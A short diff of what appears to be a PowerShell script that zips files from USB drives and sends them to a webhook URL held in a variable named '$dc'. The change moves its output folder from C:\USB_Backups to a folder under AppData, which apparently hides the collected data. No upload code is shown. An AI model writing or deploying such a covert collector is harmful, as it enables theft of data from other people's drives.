@@ -1,7 +1,7 @@
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $WebhookUrl = $dc
 $MaxZipSize = 10MB
-$OutputDir = "C:\USB_Backups"
+$OutputDir = "$env:APPDATA\USB_Backup_Data"
 $TempDir = "$OutputDir\Temp"
 $VideoExtensions = @('.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.mpeg', '.mpg')
 $ProcessedDrives = @{}
